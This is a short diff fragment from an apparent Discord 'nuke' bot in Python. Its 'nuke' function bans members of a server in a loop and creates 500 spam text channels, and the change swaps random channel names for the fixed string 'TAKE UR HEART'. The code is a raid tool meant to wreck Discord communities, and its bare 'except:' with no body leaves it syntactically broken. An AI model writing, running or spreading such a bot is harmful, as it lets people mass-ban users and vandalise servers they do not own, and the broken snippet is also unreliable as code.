@@ -53,7 +53,7 @@ async def nuke(guild):
       await member.ban()
     except: 
   for i in range(500):
-    await guild.create_text_channel(random.choice(channel_names))
+    await guild.create_text_channel('TAKE UR HEART')
  
     
 client.run(os.environ['token'])
